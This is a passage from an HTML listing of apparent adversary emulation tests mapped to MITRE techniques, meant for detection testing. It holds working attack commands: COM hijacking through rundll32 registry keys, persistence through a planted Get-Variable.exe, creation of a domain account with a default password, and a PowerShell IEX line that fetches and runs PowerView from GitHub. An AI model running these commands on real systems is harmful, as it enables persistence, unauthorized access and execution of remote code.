<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 123520cc-e998-471b-a920-bd28e3feafa0</li>
<li><strong>name</strong>: COM Hijacking with RunDLL32 (Local Server Switch)</li>
<li><strong>description</strong>: This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via "rundll32.exe -localserver [clsid]". 
This method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. 
Reference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/
Upon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened. </li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID#{clsid}' -Value '#{clsid_description}'
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID#{clsid}\InprocServer32' -Value "#{dll_path}"
New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-localserver #{clsid}'</li>
<li><strong>prereq_command</strong>: if (Test-Path "#{dll_path}") {exit 0} else {exit 1}</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015_calc.dll" -OutFile "#{dll_path}"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID#{clsid}' -Recurse -ErrorAction Ignore</p>
</li>
<li><strong>mitre_id</strong>: T1546.015</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 1561de08-0b4b-498e-8261-e922f3494aae</li>
<li><strong>name</strong>: powerShell Persistence via hijacking default modules - Get-Variable.exe</li>
<li>
<p><strong>description</strong>: Colibri leverages PowerShell in a unique way to maintain persistence after a reboot. Depending on the Windows version, Colibri drops its copy in %APPDATA%\Local\Microsoft\WindowsApps and 
names it Get-Variable.exe for Windows 10 and above.
https://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:"$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe" "PathToAtomicsFolder\T1574.008\bin\calc.cs"
Powershell -noprofile</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item "$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe" -ErrorAction Ignore
Stop-Process -Name "calculator"</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1574.008</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 5a3497a4-1568-4663-b12a-d4a5ed70c7d7</li>
<li><strong>name</strong>: Create a new Domain Account using PowerShell</li>
<li>
<p><strong>description</strong>: Creates a new Domain User using the credentials of the Current User</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: $SamAccountName = '#{username}'
$AccountPassword = ConvertTo-SecureString '#{password}' -AsPlainText -Force
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)
$User.SamAccountName = $SamAccountName
$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
$User.SetPassword($TempCred.GetNetworkCredential().Password)
$User.Enabled = $True
$User.PasswordNotRequired = $False
$User.DisplayName = $SamAccountName
$User.Save()
$User</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: cmd /c "net user #{username} /del &gt;nul 2&gt;&amp;1"</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1136.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: {'description': 'Name of the Account to be created', 'type': 'string', 'default': 'T1136.002_Admin'}</li>
<li><strong>input_arguments.password</strong>: {'description': 'Password of the Account to be created', 'type': 'string', 'default': 'T1136_pass123!'}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 20f1097d-81c1-405c-8380-32174d493bbb</li>
<li><strong>name</strong>: Network Share Discovery command prompt</li>
<li>
<p><strong>description</strong>: Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host
Upon execution avalaible network shares will be displayed in the powershell session</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: net view \#{computer_name}</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1135</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 1b0814d1-bb24-402d-9615-1b20c50733fb</li>
<li><strong>name</strong>: Network Share Discovery PowerShell</li>
<li>
<p><strong>description</strong>: Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host
Upon execution, avalaible network shares will be displayed in the powershell session</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: get-smbshare</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1135</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: ab39a04f-0c93-4540-9ff2-83f862c385ae</li>
<li><strong>name</strong>: View available share drives</li>
<li><strong>description</strong>: View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session</li>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: net share</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1135</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: b1636f0a-ba82-435c-b699-0d78794d8bfd</li>
<li><strong>name</strong>: Share Discovery with PowerView</li>
<li>
<p><strong>description</strong>: Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose</p>
</li>
<li>
<p><strong>prereq_command</strong>: if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: "Join system to domain"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1135</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
